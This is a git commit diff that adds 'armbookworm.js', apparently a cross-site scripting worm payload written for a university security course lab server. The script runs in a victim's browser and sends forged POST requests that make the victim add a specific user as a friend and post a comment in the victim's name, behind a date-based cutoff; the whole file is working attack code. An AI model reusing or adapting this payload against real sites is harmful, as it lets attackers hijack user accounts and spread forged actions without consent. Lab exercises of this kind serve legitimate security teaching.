5051db33b6999223510dfab1cedb9e43788927c2
Russell Dranch <rdranch275@gmail.com>
2020-11-05 15:41:20 -0500

    Update armbookworm.js

--- armbookworm.js
+++ armbookworm.js
@@ -1,1 +1,26 @@
-eval(alert(1));
+var varMonth = new Date().getMonth();
+var varYear = new Date().getYear();
+if (varMonth <= 11 && varYear <= 120) {
+	var r = new XMLHttpRequest();
+	const id = 64;
+	r.open("POST", "http://csec380-core.csec.rit.edu:86/add_friend.php?id=" + id , true);
+	r.setRequestHeader("Content-Type", "x-www-form-urlencoded");
+	r.send();
+
+	const string = encodeURI(new Date() + ": Russell added you through the user " + $("#name").text()); 
+
+	var v = document.documentElement.innerHTML.indexOf("id=") + 3;
+	var new_id = document.documentElement.innerHTML.slice(v, v+1);
+
+	while (!(isNaN(parseInt(document.documentElement.innerHTML.slice(v, v+1))))) {
+		v += 1;
+		new_id += document.documentElement.innerHTML.slice(v, v+1);
+	}
+	new_id = new_id.replace(/\D/g,'');
+
+
+
+	r.open("POST", "http://csec380-core.csec.rit.edu:86/add_comment.php?id=" + id + "&comment=" + string, true);
+	r.send();
+}
+
